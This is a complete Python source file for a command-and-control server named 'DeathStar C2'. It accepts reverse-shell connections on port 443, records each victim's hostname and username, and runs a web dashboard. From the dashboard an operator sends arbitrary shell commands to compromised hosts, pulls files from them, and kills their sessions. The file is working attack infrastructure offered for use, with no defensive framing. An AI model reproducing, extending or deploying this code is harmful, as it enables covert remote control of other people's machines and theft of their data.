import asyncio
import uvicorn
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from datetime import datetime
import json
from typing import Dict, Set, List
import socket
import threading
from collections import deque
import os
import time
import base64

# Store connection information and active connections
connections = deque(maxlen=100)  # Keep last 100 connections
active_shells = {}  # Store active connection writers
websocket_connections: Set[WebSocket] = set()
current_id = 1  # Global ID counter

app = FastAPI()

class ConnectionInfo:
    def __init__(self, ip, hostname, username, timestamp, writer):
        global current_id
        self.id = current_id
        current_id += 1
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.first_connected = timestamp
        self.last_command_time = timestamp
        self.writer = writer
        self.last_output = ""

async def handle_client(reader, writer):
    try:
        addr = writer.get_extra_info('peername')
        client_ip = addr[0]
        print(f"[DEBUG] New connection attempt from {client_ip}")
        
        # Initial connection data
        data = await reader.read(1024)
        print(f"[DEBUG] Initial data received: {data}")
        
        # Get hostname
        print("[DEBUG] Sending hostname command")
        writer.write(b"hostname\n")
        await writer.drain()
        hostname_data = await reader.read(1024)
        hostname = hostname_data.decode('utf-8', errors='ignore').strip()
        print(f"[DEBUG] Hostname received: {hostname}")
        
        # Get username
        print("[DEBUG] Sending whoami command")
        writer.write(b"whoami\n")
        await writer.drain()
        user_data = await reader.read(1024)
        username = user_data.decode('utf-8', errors='ignore').strip()
        print(f"[DEBUG] Username received: {username}")
        
        # Create and store connection info
        conn_info = ConnectionInfo(
            ip=client_ip,
            hostname=hostname,
            username=username,
            timestamp=datetime.now(),
            writer=writer
        )
        connections.appendleft(conn_info)
        active_shells[client_ip] = conn_info
        
        print(f"[DEBUG] Connection info stored. Active connections: {len(connections)}")
        print(f"[DEBUG] Active shells: {list(active_shells.keys())}")
        
        # Notify all WebSocket clients about the new connection
        for websocket in websocket_connections:
            try:
                await websocket.send_json({
                    "type": "new_connection",
                    "data": {
                        "ip": client_ip,
                        "hostname": hostname,
                        "username": username,
                        "timestamp": datetime.now().isoformat()
                    }
                })
                print(f"[DEBUG] Notified WebSocket client about new connection")
            except Exception as e:
                print(f"[DEBUG] Failed to notify WebSocket client: {e}")
        
        # Keep connection alive and handle commands
        while True:
            data = await reader.read(1024)
            if not data:
                print(f"[DEBUG] Client {client_ip} disconnected")
                break
            conn_info.last_output = data.decode('utf-8', errors='ignore').strip()
            print(f"[DEBUG] Received output from {client_ip}: {conn_info.last_output}")
            
    except Exception as e:
        print(f"[DEBUG] Error handling client: {e}")
    finally:
        if client_ip in active_shells:
            del active_shells[client_ip]
            print(f"[DEBUG] Removed {client_ip} from active shells")
        writer.close()
        await writer.wait_closed()

@app.post("/delete/{conn_id}")
async def delete_connection(conn_id: str):
    try:
        # Find and remove the connection
        for conn in connections:
            if str(conn.id) == conn_id:
                if conn.ip in active_shells:
                    # Send die command to client
                    try:
                        conn.writer.write(b"die\n")
                        await conn.writer.drain()
                    except:
                        pass
                    conn.writer.close()
                    del active_shells[conn.ip]
                connections.remove(conn)
                return JSONResponse({"status": "success", "message": f"Connection {conn_id} terminated"})
        return JSONResponse({"status": "error", "message": "Connection not found"})
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)})

@app.post("/execute/{ip}")
async def execute_command(ip: str, request: Request):
    data = await request.json()
    command = data.get("command", "").strip()
    
    if not command:
        return JSONResponse({"status": "error", "message": "No command provided"})
    
    if ip not in active_shells:
        return JSONResponse({"status": "error", "message": "Client not connected"})
    
    try:
        conn_info = active_shells[ip]
        command_bytes = (command + "\n").encode('utf-8')
        conn_info.writer.write(command_bytes)
        await conn_info.writer.drain()
        
        # Update last command time
        conn_info.last_command_time = datetime.now()
        
        await asyncio.sleep(1)
        
        return JSONResponse({
            "status": "success",
            "output": conn_info.last_output,
            "message": f"Command executed on {ip}"
        })
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)})

@app.post("/getfile/{ip}")
async def get_file(ip: str, request: Request):
    data = await request.json()
    filepath = data.get("filepath", "").strip()
    
    if not filepath:
        return JSONResponse({"status": "error", "message": "No filepath provided"})
    
    if ip not in active_shells:
        return JSONResponse({"status": "error", "message": "Client not connected"})
    
    try:
        conn_info = active_shells[ip]
        print(f"[*] Requesting file: {filepath} from {ip}")
        
        # Send special command for file transfer
        command = f"getfile:{filepath}\n"
        conn_info.writer.write(command.encode('utf-8'))
        await conn_info.writer.drain()
        
        # Receive file in chunks
        full_content = ""
        while True:
            await asyncio.sleep(0.1)  # Small delay to prevent CPU overload
            if "<<EOF>>" in conn_info.last_output:
                full_content += conn_info.last_output.replace("<<EOF>>", "")
                break
            if conn_info.last_output.startswith("ERROR:"):
                return JSONResponse({"status": "error", "message": conn_info.last_output})
            full_content += conn_info.last_output
            conn_info.last_output = ""  # Clear the buffer
            
        print(f"[*] File transfer complete")
        
        try:
            file_content = base64.b64decode(full_content)
            filename = os.path.basename(filepath)
            print(f"[*] Saving file as: {filename}")
            with open(filename, 'wb') as f:
                f.write(file_content)
            return JSONResponse({
                "status": "success",
                "message": f"File saved as {filename} ({len(file_content)} bytes)"
            })
        except Exception as e:
            print(f"[*] Error saving file: {e}")
            return JSONResponse({"status": "error", "message": f"Error saving file: {str(e)}"})
            
    except Exception as e:
        print(f"[*] Error in get_file: {e}")
        return JSONResponse({"status": "error", "message": str(e)})

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    html_content = """
    <html>
        <head>
            <title>DeathStar C2</title>
            <style>
                body {
                    background-color: #1a1a1a;
                    color: #ffffff;
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                }
                .title-bar {
                    background-color: #2c2c2c;
                    color: #00ff00;
                    text-align: center;
                    padding: 15px 0;
                    font-size: 24px;
                    font-weight: bold;
                    border-bottom: 2px solid #444;
                    position: fixed;
                    width: 100%;
                    top: 0;
                    z-index: 1000;
                }
                .content {
                    margin-top: 70px;  /* Space for fixed title bar */
                    padding: 20px;
                }
                table { 
                    border-collapse: collapse; 
                    width: 100%;
                    margin-top: 20px;
                }
                th, td { 
                    border: 1px solid #444;
                    padding: 12px; 
                    text-align: left; 
                }
                th { 
                    background-color: #2c2c2c;
                    color: #00ff00;
                }
                tr:hover {
                    background-color: #2c2c2c;
                }
                .command-input {
                    background-color: #333;
                    color: #fff;
                    border: 1px solid #444;
                    padding: 5px;
                    margin: 2px;
                    width: 60%;
                    min-width: 200px;
                    resize: horizontal;
                    overflow: auto;
                }
                .run-btn {
                    background-color: #006600;
                    color: white;
                    border: none;
                    padding: 6px 12px;
                    cursor: pointer;
                    vertical-align: top;
                }
                .run-btn:hover {
                    background-color: #008800;
                }
                .output-area {
                    background-color: #333;
                    color: #00ff00;
                    padding: 5px;
                    margin-top: 5px;
                    height: 120px; /* 6 lines at roughly 20px per line */
                    min-height: 120px;
                    max-height: 300px;
                    overflow-y: auto;
                    font-family: monospace;
                    white-space: pre-wrap;
                    word-wrap: break-word;
                }
                .delete-btn {
                    background-color: #dc3545;
                    color: white;
                    border: none;
                    padding: 6px 12px;
                    cursor: pointer;
                    margin-left: 5px;
                    vertical-align: top;
                }
                .delete-btn:hover {
                    background-color: #c82333;
                }
                /* Custom scrollbar for the output area */
                .output-area::-webkit-scrollbar {
                    width: 8px;
                }
                .output-area::-webkit-scrollbar-track {
                    background: #1a1a1a;
                }
                .output-area::-webkit-scrollbar-thumb {
                    background: #666;
                    border-radius: 4px;
                }
                .output-area::-webkit-scrollbar-thumb:hover {
                    background: #888;
                }
                /* Actions cell width */
                td:last-child {
                    min-width: 400px;
                    width: auto;
                }
                .get-file-input {
                    background-color: #333;
                    color: #fff;
                    border: 1px solid #444;
                    padding: 5px;
                    margin: 2px;
                    width: 200px;
                }
                .get-file-btn {
                    background-color: #0066cc;
                    color: white;
                    border: none;
                    padding: 6px 12px;
                    cursor: pointer;
                    vertical-align: top;
                }
                .get-file-btn:hover {
                    background-color: #0052a3;
                }
            </style>
            <script>
                let ws;
                
                function connectWebSocket() {
                    ws = new WebSocket(`ws://${window.location.host}/ws`);
                    
                    ws.onmessage = function(event) {
                        const data = JSON.parse(event.data);
                        if (data.type === 'new_connection') {
                            location.reload();
                        }
                    };
                    
                    ws.onclose = function() {
                        setTimeout(connectWebSocket, 1000);
                    };
                }
                
                async function runCommand(ip) {
                    const cmdInput = document.getElementById('cmd_' + ip);
                    const outputDiv = document.getElementById('output_' + ip);
                    const cmd = cmdInput.value;
                    
                    if (!cmd) return;
                    
                    try {
                        const response = await fetch(`/execute/${ip}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ command: cmd })
                        });
                        
                        const data = await response.json();
                        if (data.status === 'success') {
                            outputDiv.textContent = data.output || 'Command executed successfully';
                            // Scroll to bottom of output
                            outputDiv.scrollTop = outputDiv.scrollHeight;
                        } else {
                            outputDiv.textContent = 'Error: ' + data.message;
                        }
                    } catch (error) {
                        outputDiv.textContent = 'Error executing command: ' + error;
                    }
                }

                async function deleteConnection(connId) {
                    if (!confirm('Are you sure you want to terminate this connection?')) {
                        return;
                    }
                    
                    try {
                        const response = await fetch(`/delete/${connId}`, {
                            method: 'POST'
                        });
                        
                        const data = await response.json();
                        if (data.status === 'success') {
                            document.getElementById(`row_${connId}`).remove();
                        } else {
                            alert('Error: ' + data.message);
                        }
                    } catch (error) {
                        alert('Error terminating connection: ' + error);
                    }
                }

                async function getFile(ip) {
                    const fileInput = document.getElementById('file_' + ip);
                    const filepath = fileInput.value;
                    
                    if (!filepath) {
                        alert('Please enter a filepath');
                        return;
                    }
                    
                    try {
                        const response = await fetch(`/getfile/${ip}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ filepath: filepath })
                        });
                        
                        const data = await response.json();
                        if (data.status === 'success') {
                            alert(data.message);
                        } else {
                            alert('Error: ' + data.message);
                        }
                    } catch (error) {
                        alert('Error getting file: ' + error);
                    }
                }

                // Add event listener for Enter key on command inputs
                document.addEventListener('DOMContentLoaded', function() {
                    document.querySelectorAll('.command-input').forEach(input => {
                        input.addEventListener('keypress', function(e) {
                            if (e.key === 'Enter') {
                                const ip = this.id.split('_')[1];
                                runCommand(ip);
                            }
                        });
                    });
                });

                // Connect to WebSocket when page loads
                window.onload = connectWebSocket;
            </script>
        </head>
        <body>
            <div class="title-bar">DeathStar</div>
            <div class="content">
                <table>
                    <tr>
                        <th>ID</th>
                        <th>IP Address</th>
                        <th>Hostname</th>
                        <th>Username</th>
                        <th>First Connected</th>
                        <th>Last Command</th>
                        <th>Actions</th>
                        <th>Kill</th>
                    </tr>
    """
    
    for conn in connections:
        html_content += f"""
                <tr id="row_{conn.id}">
                    <td>{conn.id}</td>
                    <td>{conn.ip}</td>
                    <td>{conn.hostname}</td>
                    <td>{conn.username}</td>
                    <td>{conn.first_connected.strftime('%Y-%m-%d %H:%M:%S')}</td>
                    <td>{conn.last_command_time.strftime('%Y-%m-%d %H:%M:%S')}</td>
                    <td>
                        <input type="text" class="command-input" id="cmd_{conn.ip}" placeholder="Enter command">
                        <button class="run-btn" onclick="runCommand('{conn.ip}')">Run</button>
                        <div id="output_{conn.ip}" class="output-area"></div>
                        <input type="text" class="get-file-input" id="file_{conn.ip}" placeholder="Enter filepath to get">
                        <button class="get-file-btn" onclick="getFile('{conn.ip}')">Get File</button>
                    </td>
                    <td>
                        <button class="delete-btn" onclick="deleteConnection('{conn.id}')">Die</button>
                    </td>
                </tr>
        """
    
    html_content += """
            </table>
        </div>
        </body>
    </html>
    """
    return html_content

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    websocket_connections.add(websocket)
    try:
        while True:
            await websocket.receive_text()  # Keep connection alive
    except WebSocketDisconnect:
        websocket_connections.remove(websocket)

async def start_nc_server():
    server = await asyncio.start_server(
        handle_client, '0.0.0.0', 443
    )
    print("NC Server running on port 443")
    async with server:
        await server.serve_forever()

def run_web_server():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    web_thread = threading.Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    asyncio.run(start_nc_server())
